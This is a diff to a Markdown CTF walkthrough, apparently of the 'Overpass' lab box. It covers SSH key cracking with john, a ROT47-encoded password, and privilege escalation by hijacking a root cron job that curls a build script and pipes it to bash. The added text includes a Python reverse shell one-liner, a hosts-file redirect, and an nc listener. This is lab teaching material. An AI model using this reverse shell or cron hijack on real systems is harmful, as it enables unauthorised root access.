@@ -57,6 +57,7 @@ async function login() {
 # ![6](images/RSA.jpg?raw=true "rsa")
 
 ``chmod 600 id_rsa``
+
 ``ssh -i id_rsa james@10.10.107.5``
 
 + **Trying to connect to ssh, a key is required for our file. Let's use ssh2john to bruteforce our way in: i'm gonna use ssh2john to get our first hash then crack it with john using the rockyou.txt wordlist**
@@ -66,6 +67,54 @@ async function login() {
 
 # ![7](images/johned.jpg?raw=true "johnny")
 
-**Using our password for the ssh we are in! There's two files into user's home directory**
+**Using our password for the ssh we are in! There's two files into user's home directory: one of them is our user's flag and the other seems to be an update of their encryption app**
+
+# ![8](images/userflag.jpg?raw=true "userfl")
+
++ **According the message inside the todo.txt file, we can see that james is using the same app to encrypt his password. Listing the hidden files inside his directory we can see another file named** *.overpass* **It seems to be james password so we're gonna use it, but first don't forget to decrypt it, because it's encrypted with ROT47, as they said in the beginning page**
+
+**Running sudo -l command, we cannot se any allowed cmds for james user**
+
+# ![9](images/noturn.jpg?raw=true "noturn")
+
++ **Let's continue and look into the /etc/crontab file**
+
+``cat /etc/crontab``
+
+# ![10](images/croned.jpg?raw=true "crontab")
+
++ **We can see a curl command, executed by root, which runs every second and transfer the data from the *buildscript.sh*, the building script for their encrypting app, into terminal, then executed by bash. This script is taken from the machine local web-site, and the domain used is overpass.thm. If we look into the /etc/hosts file we can see the overpass.thm dns belongs to the local ip of the machine**
+
+# ![11](images/hostsetc.png?raw=true "hostsetc")
+
++ **What if we can run our own script on this machine? If we modify the overpass.thm domain into our local machine domain, we can host locally a python server and upload maybe a python script which get us a reverse shell. The respective script is executed by root so we're gonna get a root shell**
+
+# ![12](images/modify.jpg?raw=true "modify")
+
+**Next step is to create a similar path with the /etc/crontab curl get request from the host - */downloads/src/buildscript.sh*. Let's do this into our local machine and we're gonna host the server into our home directory**
+
+``mkdir downloads``
+``mkdir src``
+
+**Now, let's create the *buildscript.sh***
+
+``python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``
+
+# ![13](images/pythoned.jpg?raw=true "pyth")
+
++ **The last step is to start our server from the home directory (on the 80 port) and then start a listener with nc**
+
+``sudo python -m SimpleHTTPServer 80``
+
+``nc -lvnp 1234``
+
+# ![14](images/rootflagos.jpg?raw=true "flagos")
+
+**And we are root! It was a nice box with a very important vulnerability based on the Broken Authentication and some exploiting crontab service. All thanks goes to the creator, NinjaJc01!**
+
+
+
+
+
 
 
